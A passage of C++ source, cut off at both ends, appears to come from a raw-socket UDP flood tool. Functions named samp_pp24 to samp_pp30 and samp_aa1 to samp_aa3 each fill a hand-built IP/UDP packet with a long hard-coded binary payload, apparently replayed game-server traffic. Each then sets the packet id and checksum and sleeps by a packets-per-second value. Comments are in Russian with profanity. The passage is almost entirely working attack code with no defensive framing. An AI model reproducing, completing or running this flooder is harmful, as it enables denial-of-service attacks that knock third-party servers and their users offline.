	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x72\x06\x48\xb6\x43\x11\x00\x14\x98\xf8\x2f\xe5\x0c\x91\x6d\x06\x23\xc0\x14\x92\xe2\x0e\xd5\xac\x93\xd0\xe6\x0c\x91\x6d\x86\x22\x00\x14\x5e\xf8\x04\xe7\x0c\x91\x6e\x06\x2e\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\xe8\x0c\x91\x6e\x86\x22\x00\x14\x58\xf8\x10\xe9\x0c\x91\x6f\x06\x23\xc0\x14\x12\xe2\x00\x0e\x40\xb5\x40\xea\x0c\x91\x6f\x86\x22\x00\x14\x14\xf0\xf0\xeb\x0c\x91\x70\x06\x27\xc0\x14\x5a\xe6\x00\xec\x53\xc4\x2b\x9f\x9b\x24\x2d\x25\xa5\x64\x20\xec\x0c\x91\x70\x86\x0c\x60\x20\x14\x2c\xc8\x00\x2d\xa0\x33\xa4\x20\x00\x0e\x77\x45\x98\xae\x11\x06\x58\x70\x1e\x30\x78\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\xed\x0c\x91\x71\x06\x22\x00\x14\x98\xf8\x07\xee\x0c\x91\x71\x86\x23\xc0\x14\x92\xe2\x01\xf9\xe5\x73\xd0\xef\x0c\x91\x72\x06\x22\x00\x14\x5e\xf8\x0c\xf0\x0c\x91\x72\x86\x2e\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\xf1\x0c\x91\x73\x06\x22\x00\x14\x58\xf8\x17\xf2\x0c\x91\x73\x86\x23\xc0\x14\x12\xe2\x00\x0e\x40\xb5\x40\xf3\x0c\x91\x74\x06\x22\x00\x14\x14\xf0\xf0\xf4\x0c\x91\x74\x86\x27\xc0\x14\x5a\xe6\x05\xeb\x67\xe4\x2b\x86\x04\xbc\x1e\xa2\x91\x14\x20\xf5\x0c\x91\x75\x06\x0c\x60\x20\x14\x2c\xc8\x00\x2d\xc0\x21\x64\xc0\x00\x1f\xaa\x40\xc8\xab\x47\x02\x98\xb3\x81\x71\xf8\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_pp24(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 53; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x0c\x8b\x48\x83\x85\x86\x30\x10\x14\x2c\xc8\x00\x2e\x40\x45\xa1\x80\x00\x1a\x19\x40\x48\x7b\xc7\x1b\x18\x87\xf5\x07\x48\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_pp25(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 239; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x45\x0b\xc8\x9f\xc5\xc6\x30\x10\x14\x2c\xc8\x00\x33\x60\x57\x22\xc0\x00\x0a\x29\x64\x18\xab\x80\x02\x18\x99\x75\x77\x18\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x09\x18\x91\x7f\x0b\xa2\x00\x14\x98\xf8\x1d\x0a\x18\x91\x7f\x8b\xa3\xc0\x14\x92\xe2\x0b\x8c\x08\x43\xd0\x0b\x18\x91\x00\x0c\x22\x00\x14\x5e\xf8\x02\x0c\x18\x91\x00\x8c\x2e\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\x0d\x18\x91\x01\x0c\x22\x00\x14\x58\xf8\x0a\x0e\x18\x91\x01\x8c\x23\xc0\x14\x12\xe2\x00\x0e\x40\xb5\x40\x0f\x18\x91\x02\x0c\x22\x00\x14\x14\xf0\xf0\x10\x18\x91\x02\x8c\x27\xc0\x14\x5a\xe6\x09\x29\x28\xcc\x21\x0a\x8a\xf4\x11\x53\xba\x4c\x20\x11\x18\x91\x03\x0c\x0c\x60\x20\x14\x2c\xc8\x00\x35\x40\x49\x22\x20\x00\x11\x91\xa0\xb8\x8b\x68\x26\x08\xa0\x4d\x37\x88\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_pp26(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 532; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x2b\x8b\x48\x93\x05\x93\xe0\x14\x5a\xe6\x05\xa4\x22\x64\x23\xf7\x19\x04\x28\x23\x02\x7c\x20\x58\x16\x91\x26\x8b\x0c\x60\x20\x14\x2c\xc8\x00\x2f\x20\x49\x48\xa0\x00\x00\x80\x22\xa8\x94\xb1\x82\x68\xb8\x07\x35\xe8\x60\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x4b\x15\x91\x20\x0a\xa2\x00\x14\x98\xf8\x1f\x4c\x15\x91\x20\x8a\xa3\xc0\x14\x92\xe2\x00\xe1\x28\xb3\xd0\x4d\x15\x91\x21\x0a\xa2\x00\x14\x5e\xf8\x06\x4e\x15\x91\x21\x8a\xae\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\x4f\x15\x91\x22\x0a\xa2\x00\x14\x58\xf8\x11\x50\x15\x91\x22\x8a\xa3\xc0\x14\x12\xe2\x00\x0e\x40\xb5\x40\x51\x15\x91\x23\x0a\xa2\x00\x14\x14\xf0\xf0\x52\x15\x91\x23\x8a\xa7\xc0\x14\x5a\xe6\x07\x06\xea\x9c\x2a\x19\x79\xa4\x23\xd6\xa8\xf4\x20\x53\x15\x91\x24\x0a\x8c\x60\x20\x14\x2c\xc8\x00\x2b\x80\x57\x81\xe0\x00\x04\xbc\xa2\x28\xb3\x8a\xff\x38\x82\x9e\x25\x98\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\xd7\x16\x91\x66\x0b\x22\x00\x14\x98\xf8\x09\xd8\x16\x91\x66\x8b\x23\xc0\x14\x92\xe2\x02\xe0\x0c\x13\xd0\xd9\x16\x91\x67\x0b\x22\x00\x14\x5e\xf8\x13\xda\x16\x91\x67\x8b\x2e\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\xdb\x16\x91\x68\x0b\x22\x00\x14\x58\xf8\x04\xdc\x16\x91\x68\x8b\x23\xc0\x14\x12\xe2\x00\x0e\x40\xb5\x40\xdd\x16\x91\x69\x0b\x22\x00\x14\x14\xf0\xf0\xde\x16\x91\x69\x8b\x27\xc0\x14\x5a\xe6\x03\x7f\x4c\x34\x2c\x04\x76\x4c\x18\xe0\xe7\x44\x20\xdf\x16\x91\x6a\x0b\x0c\x60\x20\x14\x2c\xc8\x00\x31\x00\x42\xc1\x20\x00\x01\x53\x78\x48\x98\xfc\x94\xd8\x96\xad\xda\x18\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x5e\x17\x91\x29\x8b\xa2\x00\x14\x98\xf8\x27\x5f\x17\x91\x2a\x0b\xa3\xc0\x14\x92\xe2\x0a\x74\xd4\x93\xd0\x60\x17\x91\x2a\x8b\xa2\x00\x14\x5e\xf8\x01\x61\x17\x91\x2b\x0b\xae\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\x62\x17\x91\x2b\x8b\xa2\x00\x14\x58\xf8\x11", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_pp27(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 511; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x21\x8b\x48\x8e\x05\x91\xe0\x14\x12\xe2\x00\x0e\x40\xb5\x40\x44\x16\x91\x1c\x8b\x22\x00\x14\x14\xf0\xf0\x45\x16\x91\x1d\x0b\x27\xc0\x14\x5a\xe6\x05\x81\x4e\x3c\x1f\xf0\x5b\x14\x25\x3b\x0a\xa4\x20\x46\x16\x91\x1d\x8b\x0c\x60\x20\x14\x2c\xc8\x00\x2e\xe0\x4b\xe3\xa0\x00\x0a\x09\x9b\xd8\x8b\x12\x7c\x58\x6c\x7a\xc3\xb8\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x39\x15\x91\x17\x0a\xa2\x00\x14\x98\xf8\x24\x3a\x15\x91\x17\x8a\xa3\xc0\x14\x92\xe2\x0c\xa1\xb8\x53\xc0\x3b\x15\x91\x18\x0a\xa2\x00\x14\x5e\xf8\x12\x3c\x15\x91\x18\x8a\xae\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\x3d\x15\x91\x19\x0a\xa2\x00\x14\x58\xf8\x10\x3e\x15\x91\x19\x8a\xa3\xc0\x14\x12\xe2\x00\x0e\x40\xb5\x40\x3f\x15\x91\x1a\x0a\xa2\x00\x14\x14\xf0\xf0\x40\x15\x91\x1a\x8a\xa7\xc0\x14\x5a\xe6\x07\x27\x90\x34\x25\xce\xfc\x1c\x10\xcd\xcf\xcc\x10\x41\x15\x91\x1b\x0a\x8c\x60\x20\x14\x2c\xc8\x00\x2b\x40\x52\xc7\x00\x00\x07\x41\x5d\xf8\x9e\x01\x01\x58\x74\x0a\xd5\xb8\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\xc5\x16\x91\x5d\x0b\x22\x00\x14\x98\xf8\x1b\xc6\x16\x91\x5d\x8b\x23\xc0\x14\x92\xe2\x0d\xc9\x91\x63\xd0\xc7\x16\x91\x5e\x0b\x22\x00\x14\x5e\xf8\x02\xc8\x16\x91\x5e\x8b\x2e\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\xc9\x16\x91\x5f\x0b\x22\x00\x14\x58\xf8\x01\xca\x16\x91\x5f\x8b\x23\xc0\x14\x12\xe2\x00\x0e\x40\xb5\x40\xcb\x16\x91\x60\x0b\x22\x00\x14\x14\xf0\xf0\xcc\x16\x91\x60\x8b\x27\xc0\x14\x5a\xe6\x00\x46\x5a\xe4\x1a\x61\xec\x2c\x29\xff\xa8\xfc\x20\xcd\x16\x91\x61\x0b\x0c\x60\x20\x14\x2c\xc8\x00\x30\xc0\x4a\x07\x00\x00\x12\x67\xe2\x48\xa6\x98\xf5\xf8\x9d\x18\x7a\x58\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x4c\x17\x91\x20\x8b\xa2\x00\x14\x98\xf8\x0e\x4d\x17\x91\x21\x0b\xa3\xc0\x14\x92\xe2\x0c\x54\x79\x33\xd0\x4e\x17\x91\x21\x8b\xa2\x00\x14\x5e\xf8\x05", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_pp28(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 14; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x78\x81\xb2\x28\x06\x03\xf1\x02\x00\xf2\x03\x87\x00\x17", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_pp29(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 5; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x79\x01\xc3\x80\x17", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_pp30(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 8; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x07\x80\x42\x20\x14\x81\xf8\x01", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_aa1(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 530; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x09\x00\x48\x82\x80\x06\x30\x10\x14\x2c\xc8\x00\x21\x40\x19\xc0\x60\x00\x15\x02\x53\xb8\x7a\x1d\xd1\xd8\x76\x1b\x25\x98\x60\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x13\x00\x91\x05\x80\x0c\x60\x20\x14\x2c\xc8\x00\x21\x60\x15\x22\x40\x00\x1a\x4f\x23\x78\xac\x73\x18\xb8\x8d\x68\xd6\xd8\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x14\x00\x91\x06\x00\x0c\x60\x20\x14\x2c\xc8\x00\x21\x80\x06\x45\x80\x00\x17\x71\x07\x48\xa7\x02\xda\xa8\x64\x93\xa7\xd8\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x15\x00\x91\x06\x80\x0c\x60\x20\x14\x2c\xc8\x00\x21\xa0\x18\xa2\xe0\x00\x00\x0d\x24\xd8\x79\x47\x18\x68\x9a\x31\xa7\x48\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x16\x00\x91\x07\x00\x0c\x60\x20\x14\x2c\xc8\x00\x21\xc0\x00\x48\x00\x00\x1d\xdb\x4f\x38\x8d\x9b\xa0\x88\x9e\x1f\xa7\xe8\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x17\x00\x91\x07\x80\x0c\x60\x20\x14\x2c\xc8\x00\x21\xe0\x1c\x03\xe0\x00\x00\x8d\x60\x38\x9f\x8c\xe1\xd8\x95\x25\x1a\x58\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x18\x00\x91\x08\x00\x0c\x60\x20\x14\x2c\xc8\x00\x22\x00\x02\x60\xe0\x00\x02\x08\xd9\x38\x7b\xc7\x33\xc8\x93\x5b\xf1\xe8\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x19\x00\x91\x08\x80\x0c\x60\x20\x14\x2c\xc8\x00\x22\x20\x1d\x07\xc0\x00\x1a\x8e\xc9\xf8\x8d\x50\x95\x88\x90\x83\x21\xb8\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x1a\x00\x91\x09\x00\x0c\x60\x20\x14\x2c\xc8\x00\x22\x40\x00\x83\x80\x00\x1d\xa7\x7d\x38\x93\xc1\x2e\x18\x8f\x28\x26\x28\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x1b\x00\x91\x09\x80\x0c\x60\x20\x14\x2c\xc8\x00\x22\x60\x0f\xa7\x80\x00\x03\xc8\x5c\xc8\x80\x9e\x20\x98\x8e\x0f\x44\xb8\x60\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_aa2(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 530; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x0e\x00\x48\x85\x00\x06\x30\x10\x14\x2c\xc8\x00\x22\x80\x1b\xe8\x00\x00\x06\x08\x4b\x68\x81\x08\xf6\xb8\x8d\xae\x67\x28\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x1d\x00\x91\x0a\x80\x0c\x60\x20\x14\x2c\xc8\x00\x22\xa0\x15\x05\x40\x00\x1a\x64\xe3\x88\xb8\xfc\xb9\xd8\x8f\x74\x25\x08\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x1e\x00\x91\x0b\x00\x0c\x60\x20\x14\x2c\xc8\x00\x22\xc0\x11\x43\x20\x00\x18\x91\x11\x78\x87\x07\x7c\x58\x74\x00\x57\xf8\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x1f\x00\x91\x0b\x80\x0c\x60\x20\x14\x2c\xc8\x00\x22\xe0\x14\x24\x80\x00\x1e\xd7\x73\xc8\x8b\x09\x14\x08\x7c\x27\x60\x78\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x20\x00\x91\x0c\x00\x0c\x60\x20\x14\x2c\xc8\x00\x23\x00\x1c\xa3\x00\x00\x08\x11\x87\x38\x42\xba\x44\xc8\xa2\xeb\xc5\x88\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x21\x00\x91\x0c\x80\x0c\x60\x20\x14\x2c\xc8\x00\x23\x20\x17\x67\xe0\x00\x11\x54\xa3\xf8\xaf\x07\x40\x98\xac\x29\xc3\xd8\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x22\x00\x91\x0d\x00\x0c\x60\x20\x14\x2c\xc8\x00\x23\x40\x18\x47\xa0\x00\x10\x1f\x8e\x08\x46\xc0\xbe\x48\x98\x22\xc6\x28\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x23\x00\x91\x0d\x80\x0c\x60\x20\x14\x2c\xc8\x00\x23\x60\x16\xe4\xa0\x00\x0e\x4f\x62\xb8\xb3\x82\xd7\x18\x8f\x0f\xeb\x28\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x24\x00\x91\x0e\x00\x0c\x60\x20\x14\x2c\xc8\x00\x23\x80\x0b\x01\xc0\x00\x1c\xd1\x52\x28\x81\x14\x61\x18\xa7\x94\xa8\xb8\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x25\x00\x91\x0e\x80\x0c\x60\x20\x14\x2c\xc8\x00\x23\xa0\x11\x20\x20\x00\x03\xed\x02\x28\xad\x44\x9d\x08\x8a\x1a\x00\x78\x60\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_aa3(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 530; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x13\x00\x48\x87\x80\x06\x30\x10\x14\x2c\xc8\x00\x23\xc0\x0e\xa0\xa0\x00\x06\x26\xe6\xe8\xbb\x50\xdf\x68\x9c\x11\xc4\xa8\x60\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x27\x00\x91\x0f\x80\x0c\x60\x20\x14\x2c\xc8\x00\x23\xe0\x18\xc2\x40\x00\x0c\x5a\x92\x08\x90\x11\x38\x98\x7a\x1b\xa6\x58\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x28\x00\x91\x10\x00\x0c\x60\x20\x14\x2c\xc8\x00\x24\x00\x08\xc3\x20\x00\x1a\xd9\x9f\x28\x98\xdc\xa1\x98\xa3\x4f\x62\x18\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x29\x00\x91\x10\x80\x0c\x60\x20\x14\x2c\xc8\x00\x24\x20\x18\x47\x20\x00\x06\x10\x22\xa8\x79\xeb\x84\x18\xb8\x14\x0c\x48\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x2a\x00\x91\x11\x00\x0c\x60\x20\x14\x2c\xc8\x00\x24\x40\x07\xe1\x40\x00\x12\xce\x1d\x88\x94\x11\x35\x38\x9b\x55\xb4\xe8\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x2b\x00\x91\x11\x80\x0c\x60\x20\x14\x2c\xc8\x00\x24\x60\x15\x47\x40\x00\x1e\x1d\x64\x08\x6b\xcf\x9d\x18\x8b\x41\x3f\x88\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x2c\x00\x91\x12\x00\x0c\x60\x20\x14\x2c\xc8\x00\x24\x80\x1b\x43\x20\x00\x15\x06\x23\xf8\xb5\x91\x64\x18\xbd\x29\xe3\x08\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x2d\x00\x91\x12\x80\x0c\x60\x20\x14\x2c\xc8\x00\x24\xa0\x08\xc6\x40\x00\x12\x68\xb4\x38\x91\xc9\xd0\xb8\x92\x7e\x66\xb8\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x2e\x00\x91\x13\x00\x0c\x60\x20\x14\x2c\xc8\x00\x24\xc0\x0f\x25\x80\x00\x07\x51\xf9\x88\x9f\x9a\x2c\xa8\x91\x6e\xa6\xe8\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x2f\x00\x91\x13\x80\x0c\x60\x20\x14\x2c\xc8\x00\x24\xe0\x04\x65\x80\x00\x05\x32\x80\x48\xb0\x53\x77\x88\x9f\x7f\xe2\x08\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00", playloadlen);
